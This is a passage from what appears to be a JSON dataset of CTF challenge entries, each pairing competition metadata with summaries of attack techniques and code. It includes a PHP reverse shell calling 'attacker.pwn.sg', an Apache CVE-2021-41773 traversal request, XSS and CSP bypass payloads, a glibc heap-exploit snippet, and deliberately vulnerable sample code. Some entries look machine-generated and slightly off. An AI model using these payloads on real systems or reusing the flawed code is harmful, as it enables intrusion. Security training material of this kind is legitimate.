            "In binary analysis challenges, when the execution mode changes (e.g., from 32 bits to 64 bits) and traditional debugging tools (like gdb) become ineffective, tooling that can handle multiple architectures (like Capstone for disassembly) can be employed to understand and reverse the binary's functionality. This is particularly useful in situations where direct analysis of the binary code is required to understand and manipulate its behavior.  \nExample concept: Using Capstone to disassemble parts of the binary that are executed in a different mode (64 bits) than the default execution mode, helping in the analysis of complex functions or changes in execution flow."
        ],
        "key": "```c\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\nint checker_1(char c, int *c1_ind, unsigned char *data) {\n    int t1[] = {0x42f, 0x3a8, 0x4d3, 0x1be, 0x1c2, 0x1c2, 0x1c3, 0x1bf, 0x3c4, 0x3c4, 0x3c4, 0x3db, 0x1be, 0x3c4, 0x4bd, 0x2c8};\n    unsigned char expected = data[t1[*c1_ind]];\n    (*c1_ind)++;\n    return c == expected;\n}\n\nint checker_2(char c, int *c2_ind) {\n    int t2[] = {0x28, 0x22, 0x1f, 0x3a, 0x1d, 0x2b, 0x15, 0x16, 0x0e, 0x5c, 0xff, 0x1b, 0x59, 0x55, 0xff, 0x0d, 0x0b, 0xff, 0xf3};\n    unsigned char expected = ((t2[*c2_ind] + *c2_ind) & 0xff) ^ 'E';\n    (*c2_ind)++;\n    return c == expected;\n}\n\nint checker_3(char c, int *c3_ind, int i) {\n    int t3[] = {0xc3, 0x98, 0xcd, 0x36, 0xef, 0x19, 0x55, 0xed, 0xc7, 0x5a, 0x9e, 0x6f, 0x19, 0x4d, 0x62, 0x9f, 0x2c, 0x81, 0x42, 0xf6, 0xd9};\n    char yeet[] = \"YEET\";\n    unsigned char expected = (t3[*c3_ind] - (i ^ yeet[i & 3]) * (i ^ yeet[i & 3])) & 0xff;\n    (*c3_ind)++;\n    return c == expected;\n}\n\nint main() {\n    unsigned char data[0x2000];\n    FILE *f = fopen(\"./happy_fun_binary\", \"rb\");\n    fread(data, 1, 0x2000, f);\n    fclose(f);\n\n    char flag[] = \"flag{h3av3ns_gate_should_b3_r3nam3d_to_planar_sh1ft_1m0}\";\n    int c1_ind = 0, c2_ind = 0, c3_ind = 0;\n\n    for (int i = 0; i < strlen(flag); i++) {\n        char c = flag[i];\n        int r = rand() % 3; // Assume rand() is seeded with 0x7a69\n\n        if (r == 0) {\n            if (!checker_1(c, &c1_ind, data)) {\n                printf(\"Checker 1 failed at index %d\\n\", i);\n                return 1;\n            }\n        } else if (r == 1) {\n            if (!checker_2(c, &c2_ind)) {\n                printf(\"Checker 2 failed at index %d\\n\", i);\n                return 1;\n            }\n        } else if (r == 2) {\n            if (!checker_3(c, &c3_ind, i)) {\n                printf(\"Checker 3 failed at index %d\\n\", i);\n                return 1;\n            }\n        }\n    }\n\n    printf(\"Flag is correct!\\n\");\n    return 0;\n}\n```"
    },
    {
        "name": "Hash My Awesome Commands",
        "write_up": "dataset/raw/Hash My Awesome Commands.md",
        "type": "The type of challenge described in the write-up is **crypto**.",
        "competition": [
            "Square/2020",
            "https://ctftime.org/event/1174/tasks/"
        ],
        "score": 150,
        "max_score": 300,
        "difficulty": 0.5,
        "knowledge": [
            "When facing HMAC verification as part of a CTF challenge, timing attacks can be used if the comparison function introduces variable delays. If the verification function uses timing differences to compare each byte of the HMAC, these can be exploited by measuring how long the server takes to respond to input with incorrect HMACs. By carefully crafting inputs and measuring response times, attackers can incrementally guess the correct HMAC one byte at a time.",
            "To exploit timing-based vulnerabilities in HMAC verifications, a brute force attack can be methodically conducted by starting with a base64-decoded dummy HMAC and incrementing each byte, observing the time taken for the server to respond. By comparing these times against expected delay intervals (as given by the server's timing function), the correct HMAC byte values can be deduced. This requires precise timing measurements and the ability to programmatically adjust and resend payloads based on the server's response times."
        ],
        "key": "```golang  \nfunc compare(s1, s2 []byte) bool {  \n       if len(s1) != len(s2) {  \n               return false  \n       }\n\n       c := make(chan bool)\n\n       // multi-threaded check to speed up comparison  \n       for i := 0; i < len(s1); i++ {  \n               go func(i int, co chan<- bool) {  \n                       // avoid race conditions  \n                       time.Sleep(time.Duration(((500*math.Pow(1.18, float64(i+1)))-500)/0.18) * time.Microsecond)  \n                       co <- s1[i] == s2[i]  \n               }(i, c)  \n       }\n\n       for i := 0; i < len(s1); i++ {  \n               if <-c == false {  \n                       return false  \n               }  \n       }\n\n       return true  \n}  \n```"
    },
    {
        "name": "hashfunction",
        "write_up": "dataset/raw/hashfunction.md",
        "type": "reverse",
        "competition": [
            "kksctf/2020",
            "https://ctftime.org/event/1112/tasks/"
        ],
        "score": -1,
        "max_score": 411,
        "difficulty": -1,
        "knowledge": [
            "When dealing with custom MD5 hashing algorithms, it's important to analyze and understand the hashing process, especially if the algorithm processes input in chunks and/or applies unique operations to each chunk. This understanding can reveal vulnerabilities or peculiarities useful for crafting an exploit. In this scenario, the password was processed in groups of 4 bytes, and characters beyond a certain length were ignored, which is a critical insight for reverse engineering the hashing function.",
            "Brute force attacks can be practical even against custom hash algorithms if the search space is limited and known. In the challenge, knowing that the password's hash was processed in 4-byte groups and applying little-endian byte order significantly reduced the brute force search space to 256^4 (4294967296) possibilities per group. This approach can be parallelized or optimized further by targeting specific parts of the hashing operation, especially when the final hash values (F's) to compare with are known.\n\nExample payload for a brute force approach:\n```python\nfor a in range(256):\n    for b in range(256):\n        for c in range(256):\n            for d in range(256):\n                F = special_hash_function(a, b, c, d) # Pseudocode for applying the unique operations of the custom hash\n                if F == target_F_value: # Replace target_F_value with the actual targeted hash chunk value\n                    print(f\"Found matching bytes: {a}, {b}, {c}, {d}\")\n                    break\n```\n(Note: The sample payload is conceptual and requires replacing `special_hash_function` and `target_F_value` with the specific function logic and hash values derived from the scenario.)"
        ],
        "key": "```go\nfunc loginHandler(w http.ResponseWriter, r *http.Request) {\n\n\tif err := r.ParseForm(); err != nil {  \n\t\tfmt.Fprintf(w, \"500: %v\", err)  \n\t\treturn  \n\t}  \n\tusername := r.FormValue(\"username\")  \n\tpassword := r.FormValue(\"password\")\n\n\tif strings.ToLower(username) != \"admin\" {  \n\t\tfmt.Fprintf(w, \"User not found!\\n\")  \n\t\treturn  \n\t}\n\n\tif MD5([]byte(password)) == \"90829146b3603e2e7daf5031b2103e9e\" {  \n\t\tfmt.Fprintf(w, \"Login successful! Flag is %s\\n\", flag)  \n\t} else {  \n\t\tfmt.Fprintf(w, \"Password is not correct!\\nExpected %s, got %s\\n\", \"90829146b3603e2e7daf5031b2103e9e\", MD5([]byte(password)))  \n\t}  \n}  \n\nfunc MD5(data []byte) string {  \n\tb := digest(data)  \n  \n\treturn hex.EncodeToString(b[:])  \n}  \n\nfunc digest(data []byte) [16]byte {  \n\tdigest := md5.Sum(data)  \n  \n\ts := len(data) / 4  \n\tif s > 4 {  \n\t\ts = 4  \n\t}  \n  \n\tfor ss := 0; ss < s; ss++ {  \n\t\tvar F uint32\n\n\t\tF = ^F\n\n\t\tfor i := 0; i < 4; i++ {  \n\t\t\tF = (F << 8) ^ table[(F>>24)^(uint32(data[ss*4+i])&0xff)]  \n\t\t}  \n\t\tF = ^F\n\n\t\tdigest[ss*4+3] = byte((F >> 24) & 0xff)  \n\t\tdigest[ss*4+2] = byte((F >> 16) & 0xff)  \n\t\tdigest[ss*4+1] = byte((F >> 8) & 0xff)  \n\t\tdigest[ss*4+0] = byte(F & 0xff)  \n\t}  \n  \n\treturn digest  \n}  \n```"
    },
    {
        "name": "hashishe cryptos",
        "write_up": "dataset/raw/hashishe cryptos.md",
        "type": "crypto",
        "competition": [
            "Blaze/2019",
            "https://ctftime.org/event/790/tasks/"
        ],
        "score": 420,
        "max_score": 420,
        "difficulty": 1.0,
        "knowledge": [
            "In the context of El Gamal encryption, if an attacker is given the ability to encrypt a single arbitrary message using the same parameters as the encrypted flag, they can exploit this by encrypting a known message and comparing the two ciphertexts to extract the flag. The attacker can find the inverse of the known encrypted message and use it to derive the shared secret \\(g^{x \\times y}\\), which can then be used to decrypt the flag with the given parameters.",
            "To exploit El Gamal encryption when given the parameters \\(p\\), \\(g\\), \\(y\\), \\(c1\\), and \\(c2\\) for an encrypted flag and allowed to encrypt an additional message, choose a known message, encrypt it, and calculate the inverse of its encryption. Multiply this inverse with the encrypted flag's \\(c2\\) to extract \\(g^{x \\times y}\\), and then use the inverse of \\(g^{x \\times y}\\) to decrypt \\(c2\\) of the flag. Tools like pwntools for interaction and gmpy for handling mathematical operations are effective for automating this exploitation process.\n\nExample of a simplified pseudo-code to demonstrate the extraction of the flag:\n```python\n# Pseudo-code and does not take into account the actual syntax or library functions exactly.\nimport gmpy2\n\n# Assuming c2_old, c2_new are given from the encryption service, and\n# m' is the known message we have chosen to encrypt (and converted to integer form).\n# c2_old and c2_new refer to the encrypted forms of the original and our chosen message, respectively.\n\n# Calculate the inverse of our message's encryption\ninverse_m_prime = gmpy2.invert(m_prime_encrypted, p)\n\n# Use the inverse to extract the shared secret g^(x * y)\ng_x_y = c2_new * inverse_m_prime % p\n\n# Calculate the inverse of the shared secret\ninverse_g_x_y = gmpy2.invert(g_x_y, p)\n\n# Apply the inverse of the shared secret to the encrypted flag to decrypt it\nflag_decrypted = c2_old * inverse_g_x_y % p\n\n# Convert the decrypted flag from integer to string if necessary\n# print(flag_decrypted) or any suitable method to display or use the flag.\n```"
        ],
        "key": "```python\ndef elgamal_encrypt(p, g, y, m):\n    x = random.randint(1, p-2)\n    c1 = pow(g, x, p)\n    s = pow(y, x, p)\n    c2 = (m * s) % p\n    return c1, c2\n```"
    },
    {
        "name": "hCorem",
        "write_up": "dataset/raw/hCorem.md",
        "type": "web",
        "competition": [
            "RealWorld/2019/Quals",
            "https://ctftime.org/event/841/tasks/"
        ],
        "score": 304,
        "max_score": 500,
        "difficulty": 0.608,
        "knowledge": [
            "When faced with a Content-Security-Policy (CSP) that restricts resources to the same domain, a possible bypass includes using the vulnerable application's own resources against itself. For instance, re-including the application\u2019s API or script file with a malicious callback function can allow execution of JavaScript even under restrictive CSP rules. This is particularly applicable in situations where the application\u2019s CSP does not restrict dynamic script execution from the source domain.\n   - Example payload: `<script src=\"/api.php/qwq?callback=alert(1)//\"></script>`",
            "The presence of the X-XSS-Protection header with the value `1; mode=block` can be bypassed by altering the encoding of injected scripts. Changing the encoding circumvents the XSS Auditor in browsers like Chrome by exploiting how the browser interprets character encodings. Using a Byte Order Mark (BOM) to change the encoding to UTF-16 or a similar encoding can prevent the XSS Auditor from recognizing and blocking reflected XSS payloads.\n   - Example payload: (Represented in hexadecimal for UTF-16LE encoding bypass)\n       ```\n       00000000: ff fe 31 00 3c 00 73 00 63 00 72 00 69 00 70 00  ..1.<.s.c.r.i.p.\n       00000010: 74 00 3e 00 61 00 6c 00 65 00 72 00 74 00 28 00  t.>.a.l.e.r.t.(.\n       00000020: 31 00 29 00 3c 00 2f 00 73 00 63 00 72 00 69 00  1.).<./.s.c.r.i.\n       00000030: 70 00 74 00 3e 00                                p.t.>.\n       ```"
        ],
        "key": "```php  \n<?php\nfunction response(array $data = [], bool $success = true, string $message = \"\"): void\n{\n    $callback = $_REQUEST['callback'] ?? null;\n    $_data = ['success' => $success, 'message' => $message, 'data' => $data];\n    if ($callback) {\n        echo sprintf(\"%s(%s)\", $callback, json_encode($_data));\n    } else {\n        echo json_encode($_data);\n    }\n}\n\nswitch ($_SERVER['PATH_INFO']) {\n    case '/qwq':\n        response([\n            'title' => 'uwu',\n        ]);\n        break;\n    default:\n        header(sprintf(\"%s 404 Not Found\", $_SERVER['SERVER_PROTOCOL']));\n        die('api not found.');\n}\n```\n"
    },
    {
        "name": "Health Portal",
        "write_up": "dataset/raw/Health Portal.md",
        "type": "misc",
        "competition": [
            "VULNCON/2021",
            "https://ctftime.org/event/1469/tasks/"
        ],
        "score": 470,
        "max_score": 472,
        "difficulty": 0.9957627118644068,
        "knowledge": [
            "When encountering a server with a known vulnerability, such as Apache/2.4.49 (Debian) being susceptible to CVE-2021-41773, a directory traversal attack can be performed to achieve remote code execution. This is accomplished by manipulating the URL to traverse to the directory where executable binaries are located, such as `/bin/sh` for shell access. The exploitability is confirmed by issuing a crafted HTTP request that includes directory traversal sequences (e.g., `/.%2e/.%2e/.%2e/.%2e/`) in the path to bypass restrictions and execute arbitrary commands.\n   - Example payload: `GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1`",
            "In scenarios where direct command execution is restricted or limited by the environment, a reverse shell can be established to gain more stable and interactive shell access. This is particularly useful in containerized environments where tools and commands may be limited. By sending a specially crafted payload that instructs the server to initiate a connection back to an attacker-controlled machine, one can execute arbitrary commands with the privileges of the web server user. Using languages like PHP in the payload can facilitate this reverse shell initiation.\n   - Example payload: `echo;php -r '$sock=fsockopen(\"attacker.pwn.sg\",1337);$proc=proc_open(\"/bin/sh -i\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'`"
        ],
        "key": "```c\n#include <stdio.h>\n#include <string.h>\n\nvoid vulnerable_function(char *input) {\n    char buffer[256];\n    strcpy(buffer, input); // Vulnerable to buffer overflow\n    printf(\"Input: %s\\n\", buffer);\n}\n\nint main(int argc, char *argv[]) {\n    if (argc != 2) {\n        printf(\"Usage: %s <input>\\n\", argv[0]);\n        return 1;\n    }\n    vulnerable_function(argv[1]);\n    return 0;\n}\n```"
    },
    {
        "name": "heap-2022",
        "write_up": "dataset/raw/heap-2022.md",
        "type": "reverse",
        "competition": [
            "Aero/2022",
            "https://ctftime.org/event/1659/tasks/"
        ],
        "score": -1,
        "max_score": -1,
        "difficulty": -1,
        "knowledge": [
            "For exploiting Use-After-Free (UAF) vulnerabilities, especially in C programming, ensure to set any pointer to `NULL` after freeing it to prevent dangling pointers which can lead to UAF bugs. This principle is crucial for secure coding practices and avoiding vulnerabilities in memory management.",
            "When dealing with modern versions of GLIBC (e.g., version 2.34 and above) where traditional exploitation techniques like hooking `__malloc_hook`, `__free_hook`, or `__realloc_hook` are not viable due to security enhancements, pivot towards exploiting structures like `__exit_funcs` for arbitrary code execution. This requires understanding of internal structures and pointer encryption/decryption in GLIBC, illustrating the necessity of adaptability in exploitation techniques amidst evolving security measures.\n   \nExample Payload Snippet for `__exit_funcs` manipulation:\n```python\n# For encryption of function pointers due to GLIBC security measures\ndef encrypt(v, key):  \n   return p64(rol(v ^ key, 0x11, 64))\n   \n# Crafting a payload to overwrite __exit_funcs entry with system()\nonexit_fun = p64(0) + p64(1) + p64(4) + encrypt(libc.sym['system'], key) + p64(heap + 0x2c0) + p64(0)\nadd(onexit_fun)\n```\nThis strategy involves creating a controlled structure on the heap, identifying and exploiting a write-what-where condition to overwrite an exit function pointer (`__exit_funcs`) with a pointer to a desirable function (`system()`), alongside crafting arguments to achieve arbitrary code execution upon program exit."
        ],
        "key": "```c\nvoid delete_chunk(void)  \n{  \n   printf(\"[?] Enter chunk id: \");  \n   size_t chunk_id = read_integer();\n\n   if (chunk_id >= chunk_idx) {  \n       puts(\"[-] Invalid chunk index!\");  \n       return;  \n   }\n\n   chunk_t *chunk = chunks[chunk_id];\n\n   if (chunk == NULL) {  \n       puts(\"[-] No such chunk!\");  \n       return;  \n   }\n\n   if (!chunk->used || chunk->ptr == NULL) {  \n       puts(\"[-] Chunk is not used!\");  \n       return;  \n   }\n\n   free(chunk->ptr);  \n   chunk->ptr = NULL;  \n   chunk->used = false;  \n   free(chunks[chunk_id]);  \n}\n```"
    },
    {
        "name": "heapmailer",
        "write_up": "dataset/raw/heapmailer.md",
        "type": "reverse",
        "competition": [
            "BalCCon/2020",
            "https://ctftime.org/event/1100/tasks/"
        ],
        "score": 497,
        "max_score": 497,
        "difficulty": 1.0,
        "knowledge": [
            "To exploit a use-after-free vulnerability in a scenario where an application does not clear a pointer after freeing associated memory, an attacker can trigger the vulnerability to control the data being pointed to by the dangling pointer. This can be achieved by allocating a new chunk of memory in the place of the previously freed one, potentially allowing arbitrary read/write operations or control flow hijack. In the provided use-after-free case, the user's identity change operation frees the current identity without nullifying the pointer. Exploiting such vulnerabilities typically involves steps to first free a chunk of memory (triggering the use-after-free condition) and then strategically placing controlled data in the memory location that the freed (now dangling) pointer points to.",
            "To exploit base64 decoding vulnerabilities that improperly handle the size of the decoded output, an attacker can pad the encoded data in such a way that the result of the size miscalculation causes a buffer overflow or allows unintended memory modification. This technique was showcased by manipulating the chunk size calculations related to base64-decoded content. The attacker can supply base64-encoded data that, when decoded, will have its size improperly calculated (due to the lack of proper padding handling) to overwrite adjacent memory structures. In the demonstrated vulnerability, this miscalculation leads to buffer overflows that can be leveraged to overwrite important data structures, such as function pointers or command buffers, with attacker-controlled data.\n\nExample payload for exploiting base64 decoding vulnerability:\n```php\nprintf(\"[+] Corrupt size\\n\");\n$payload = str_repeat(\"\\x00\", 0x48) . pack(\"v\", SIZE | 1);\n$payload = rtrim(base64_encode($payload), \"=\");\nchnk($t, $payload);\n```"
        ],
        "key": "```cpp\ncout << \"New identity: \";\ninputSize = readInput(input);\n\n/* Free current identity */\nif(user->next != nullptr)\n\tdelElt(user->next);\n\n/* Executed only if there is a name ! */\nif(input[0] != 0) {\n\tstruct list *list;\n\n\t/* Create a new element that contains the user's input */\n\tlist = newElt(inputSize);\n\tcopyString(input, input + inputSize, &list->data);\n\n\tuser->next = list;\n}\n```\n\n```cpp\nstruct list *list;\n\ncout << \"Base64-encoded data: \";\ninputSize = readInput(input);\n\nlist = newElt(((inputSize - 1) / 4) * 3);\n/* [...] */\nchunks = list;\nb64decode(input, &list->data);\n```"
    },
    {
        "name": "Heavy computation",
        "write_up": "dataset/raw/Heavy computation.md",
        "type": "crypto",
        "competition": [
            "SharkyCTF/2020",
            "https://ctftime.org/event/1034/tasks/"
        ],
        "score": 399,
        "max_score": 600,
        "difficulty": 0.665,
        "knowledge": [
            "When dealing with a cryptographic algorithm that involves large exponentiations, optimization using Euler's totient function (phi) can significantly reduce computation time. This is especially useful in scenarios such as brute forcing, where the computation of `pow(base, exponent, modulus)` becomes impractical due to very large exponents. Optimization is performed by computing the exponent mod `phi(n)` of the modulus, where `n` is the modulus and `phi` is Euler's totient function, essentially representing `n` reduced by its prime factors.\n   - Example: Instead of computing `start ** e % N` in a loop, use `start = pow(password, pow(e, NB_ITERATIONS, phi), N)` where `phi` is precomputed.",
            "For problems that involve iterative operations over large numbers, utilizing mathematical properties such as the sum of a geometric series or the modular inverse can simplify the operations. In cases where an algorithm involves operations like repeated multiplication or exponentiation, summing up these operations into a single formula can improve the efficiency drastically. This requires understanding and applying number theory concepts such as geometric series summation (`(e ** NB_ITERATIONS - 1) / (e - 1)`) and using the modular inverse to find an exponent that effectively simulates the iterative process in a condensed form.\n   - Example: To avoid iterating with `key = key ** e * start % N`, calculate the big exponent through a geometric progression sum and use `key = pow(start, big_exponent, N)` where `big_exponent` is computed as a sum and then simplified via modular arithmetic with `phi`."
        ],
        "key": "```python\ndef derive_key(password):  \n    start = bytes_to_long(password)\n\n    # Making sure I am safe from offline bruteforce attack  \n    for i in range(NB_ITERATIONS):  \n        start = start ** e  \n        start %= N  \n  \n    # We are never too cautious let's make it harder  \n    key = 1  \n    for i in range(NB_ITERATIONS):  \n        key = key ** e  \n        key %= N  \n        key *= start  \n        key %= N  \n  \n    return sha256(long_to_bytes(key)).digest()\n```"
    },
    {
        "name": "Heisenberg's Password",
        "write_up": "dataset/raw/Heisenberg's Password.md",
        "type": "forensics",
        "competition": [
            "BSidesDelhi/2020",
            "https://ctftime.org/event/1158/tasks/"
        ],
        "score": 895,
        "max_score": 1000,
        "difficulty": 0.895,
        "knowledge": [
            "When faced with a memory forensics challenge, Volatility can be used to identify the operating system of a memory dump by analyzing the KDBG structure. This process helps in understanding the memory model and obtaining system information critical for further analysis. The `imageinfo` plugin in Volatility provides such details, which include the suggested profile for the dump, operating system version, service pack, system architecture (32-bit vs 64-bit), and date and time of the image. This step is crucial for setting the appropriate profile for analyzing the dump.",
            "To find the last modified date of a file within a Windows memory dump, the `mftparser` plugin in Volatility can be utilized. The master file table (MFT) contains metadata about each file on the NTFS file system, including file sizes, timestamps (creation, modification), permissions, and data content. By parsing the MFT, one can extract valuable information about file transactions, which is useful in forensics investigations to track file activities and potentially uncover evidence. \n\nFor instance, to find the last modified date of `loveyou.png`, use the following command:\n```\npython vol.py -f [path_to_memory_dump] --profile=[appropriate_profile] mftparser | grep \"loveyou.png\"\n```\nThis command filters the results to show entries related to `loveyou.png`, allowing one to identify the modification timestamp."
        ],
        "key": "```python\ndef check_password(input_password):\n    stored_password_parts = {\n        \"part1\": \"2020-09-30_13:54:56\",\n        \"part2\": \"7fa07960\",\n        \"part3\": \"2020-09-30_14:04:39\"\n    }\n    correct_password = f\"{stored_password_parts['part1']}${stored_password_parts['part2']}${stored_password_parts['part3']}\"\n    if input_password == correct_password:\n        return True\n    else:\n        return False\n```"
    },
    {
        "name": "Helliptic",
        "write_up": "dataset/raw/Helliptic.md",
        "type": "crypto",
        "competition": [
            "LedgerDonjon/2021",
            "https://ctftime.org/event/1516/tasks/"
        ],
        "score": 250,
        "max_score": 400,
        "difficulty": 0.625,
        "knowledge": [
            "When exploiting vulnerable elliptic curve implementations, one effective strategy is the use of twist attacks on servers using specific curves like secp256k1. To perform this, attackers can register a public key with a small order on a curve that is isogenous (similar in structure) to the server's curve. This process can yield a limited set of possible shared secrets between a server and attacker, thereby reducing the encryption key space to a manageable brute-force attack. This method relies on the server's failure to validate public keys properly, allowing the submission of keys that do not belong to the curve but to a twisted curve with weak properties. \n\n    - Condition: This strategy is applicable in situations where a server performs key exchanges using elliptic curves without properly validating that public keys submitted by clients indeed belong to the expected curve. This can often be leveraged in scenarios where elliptic curve cryptography (ECC) is used for securing communications, like TLS.\n\n    - Knowledge: Generate a public key on a twisted curve with a small order and use it to interact with the target server, exploiting the weak elliptic curve to decrypt or forge messages. By creating a public key that the server believes belongs to a legitimate curve, an attacker can manipulate the ECDH (Elliptic Curve Diffie-Hellman) exchange, leading to predictable and limited results when the server calculates the shared secret. This dramatically simplifies the process of decrypting intercepted encrypted messages or impersonating a user.",
            "To recover encrypted messages using the invalid curve method, one can employ a series of modulus operations using the Chinese Remainder Theorem (CRT) to combine results from multiple interactions with the server. This involves crafting specific public keys to create predictable shared secrets, decrypting responses from the server, and using the CRT to solve for the unknown private key.\n\n    - Condition: This approach is particularly useful in scenarios involving end-to-end encrypted messages where one party's private key is compromised or inferred. The technique relies on being able to interact with the server using specially crafted public keys that result in a predictable or limited set of possible encryption keys.\n\n    - Knowledge: Once the attacker has a set of possible encryption keys from interacting with the server using invalid curve points, the CRT can be applied to find a solution that matches the encryption key used in the communication with the victim. This solution provides a way to decrypt messages that were previously assumed secure due to the cryptographic properties of ECC."
        ],
        "key": "```javascript\n'use strict';\n\nconst crypto = require(\"crypto\");\n\nmodule.exports = { decrypt, encrypt };\n\nfunction big_int_to_buffer(n, size) {  \n   var s = BigInt(n).toString(16);  \n   while (s.length < size * 2) {  \n       s = '0' + s;  \n   }  \n   return Buffer.from(s, 'hex');  \n}\n\nfunction kdf(secret) {  \n   const key = big_int_to_buffer(secret, 32);  \n   return crypto.createHash('sha256').update(key).digest();  \n}\n\nfunction encrypt(text, secret, iv) {  \n   const key = kdf(secret);  \n   iv = big_int_to_buffer(iv, 16);  \n   const cipher = crypto.createCipheriv(\"aes-256-cbc\", key, iv);  \n   return cipher.update(text, \"utf-8\", \"hex\") + cipher.final(\"hex\");  \n}\n\nfunction decrypt(encrypted, secret, iv) {  \n   const key = kdf(secret);  \n   iv = big_int_to_buffer(iv, 16);  \n   const cipher = crypto.createDecipheriv(\"aes-256-cbc\", key, iv);  \n   return cipher.update(encrypted, \"hex\", \"utf-8\") + cipher.final(\"utf-8\");  \n}\n\nmodule.exports = { big_int_to_buffer, decrypt, encrypt };  \n```\n\n```javascript\nconst EC = require('elliptic').ec;  \nvar ec = new EC('p256');\n\nclass User {  \n...  \n   derive_secret(pubkey) {  \n       if (this.e2e) {  \n           throw `User.derive_secret() can't be called when end-to-end encryption is enabled`;  \n       }  \n       return ec.keyFromPrivate(this.key, 'hex').derive(pubkey);  \n   }  \n...  \n}  \n```"
    },
    {
        "name": "HelloWorld",
        "write_up": "dataset/raw/HelloWorld.md",
        "type": "This write-up describes a reverse engineering (reverse) challenge.",
        "competition": [
            "DarkCTF/2020",
            "https://ctftime.org/event/1118/tasks/"
        ],
        "score": 298,
        "max_score": 499,
        "difficulty": 0.5971943887775552,
        "knowledge": [
            "In binary reverse engineering challenges, using tools like Ghidra for decompilation can provide insights into the program's logic, such as conditional checks and argument verification routines. This knowledge can guide where to set breakpoints in a debugger, like GDB, for dynamic analysis. Specifically, look for calls to comparison functions (e.g., `strcmp`) that could be involved in argument validation to identify expected input values.",
            "When dealing with binary programs that expect certain arguments, using GDB to set breakpoints on comparison instruction calls (`strcmp` in this case) and examining the values of registers involved (e.g., `rsi` and `rdi` in x86_64 architecture) can reveal the expected argument values. This method can be particularly effective when source code is not available, and static analysis alone does not yield clear insights into required input values for successful execution.\n\nExample GDB commands to set breakpoints and examine registers:\n```\n(gdb) break *<address_of_strcmp>\n(gdb) run <arg1> <arg2>\n(gdb) info registers rsi rdi\n```"
        ],
        "key": "```c\n#include <stdio.h>\n#include <string.h>\n\nint check(const char *arg, int num) {\n    if (num == 1) {\n        return strcmp(arg, \"H3ll0\");\n    } else if (num == 2) {\n        return strcmp(arg, \"W0rld\");\n    }\n    return -1;\n}\n\nvoid print() {\n    printf(\"darkCTF{4rgum3nts_are_v3ry_1mp0rt4nt!!!}\\n\");\n}\n\nint main(int argc, char *argv[]) {\n    if (argc == 3) {\n        if (check(argv[1], 1) == 0) {\n            if (check(argv[2], 2) == 0) {\n                print();\n            } else {\n                printf(\"Invalid argument: %s\\n\", argv[2]);\n            }\n        } else {\n            printf(\"Invalid argument: %s\\n\", argv[1]);\n        }\n    } else {\n        printf(\"Usage: %s <arg1> <arg2>\\n\", argv[0]);\n    }\n    return 0;\n}\n```"
    },
    {
        "name": "Help Mars!",
        "write_up": "dataset/raw/Help Mars!.md",
        "type": "This challenge falls under the category of **misc** (Miscellaneous) for CTF (Capture The Flag) competitions.",
        "competition": [
            "CTFZone/2018/Quals",
            "https://ctftime.org/event/632/tasks/"
        ],
        "score": 141,
        "max_score": 500,
        "difficulty": 0.282,
        "knowledge": [
            "When encountering challenges requiring the search for specific sequences or combinations within a large dataset, a dynamic programming approach can efficiently reduce computation time. This method involves breaking down the problem into smaller, manageable subproblems, solving each subproblem just once, and storing their solutions - ideally in a hash map for quick access. By caching these results, the algorithm avoids redundant calculations, speeding up the process significantly. This approach is especially effective in scenarios where the problem can be divided into overlapping subproblems, allowing for the optimization of both time and space complexity.",
            "For challenges involving the synthesis or construction of a specific target from a set of given elements (such as sequences, numbers, or strings), iterative comparison and selection can be applied. Starting from the beginning of the target, iteratively search for the available elements that can construct the target, ensuring at each step to choose the element that keeps the solution optimal (e.g., shortest in length, minimal in number, or another defined criteria). The decision at each step considers both the immediate impact (choosing the current best fit) and the long-term outcome (ensuring the overall solution remains optimal). This process may involve checking the existence of the current segment in a predefined set or map, and recursively continuing the process with the remaining part of the target. \n\nExample Payload:\n```python  \ndef solve(target, samples):\n    sample_to_ind = {sample: i for i, sample in enumerate(samples)}\n    max_sample_len = max(len(sample) for sample in samples)\n\n    def find_min_combination(suffix):\n        if not suffix:\n            return []\n        best = None\n        for i in range(1, min(max_sample_len, len(suffix)) + 1):\n            if suffix[:i] not in sample_to_ind:\n                continue\n            current = find_min_combination(suffix[i:])\n            if current is not None and (best is None or len(current) < len(best)):\n                best = [sample_to_ind[suffix[:i]]] + current\n        return best\n\n    return find_min_combination(target)\n```"
        ],
        "key": "```python  \ndef f(suffix):  \n   # ... check for the base case  \n   # ... look for a computed value in cache  \n   best = None  \n   for i in xrange(1, min(max_sample_len, len(suffix))+1):  \n       if suffix[:i] not in sample_to_ind: continue  \n       current = f(suffix[i:])  \n       if (best is None and current is not None) or (best is not None and current is not None and len(best) > len(current)):  \n           current.append(sample_to_its_ind[suffix[:i]])  \n           best = current  \n   # ... caching  \n   return best  \n```"
    },
    {
        "name": "Hey Buddy!",
        "write_up": "dataset/raw/Hey Buddy!.md",
        "type": "web",
        "competition": [
            "vishwa/2022",
            "https://ctftime.org/event/1548/tasks/"
        ],
        "score": 250,
        "max_score": 500,
        "difficulty": 0.5,
        "knowledge": [
            "When dealing with Server Side Template Injection (SSTI) vulnerabilities, particularly in applications built with the Flask framework, exploring the application's environment can reveal useful objects and methods that can be abused to execute arbitrary commands. This exploration can include invoking methods from the Flask `config` object to access Python's built-in objects and functions, thereby leading to information disclosure or remote code execution. This approach is effective in environments where the application server has access to Python's standard libraries and the underlying operating system's command line interface.",
            "In scenarios where command execution is limited by web application filtering mechanisms that restrict the use of spaces or certain characters in commands, the Internal Field Separator (`$IFS`) can be used as an alternative to bypass these restrictions. The `$IFS` character in Linux and UNIX environments allows for the separation of command arguments where spaces would normally be used, enabling the execution of commands that require arguments. This technique is particularly useful in web security contexts where traditional command injection payloads are filtered or blocked.\n   \n   Example payload: `cat${IFS}flag.txt`"
        ],
        "key": "```python\nfrom flask import Flask, request\n\napp = Flask(__name__)\n\n@app.route('/submit', methods=['GET'])\ndef submit():\n    name = request.args.get('name', '')\n    # Vulnerable to Server Side Template Injection\n    return f\"Hello, {name}\"\n\nif __name__ == '__main__':\n    app.run()\n```"
    },
    {
        "name": "HID",
        "write_up": "dataset/raw/HID.md",
        "type": "The type of this CTF challenge is **forensics**.",
        "competition": [
            "SyskronSecurity/2020",
            "https://ctftime.org/event/1148/tasks/"
        ],
        "score": 300,
        "max_score": 500,
        "difficulty": 0.6,
        "knowledge": [
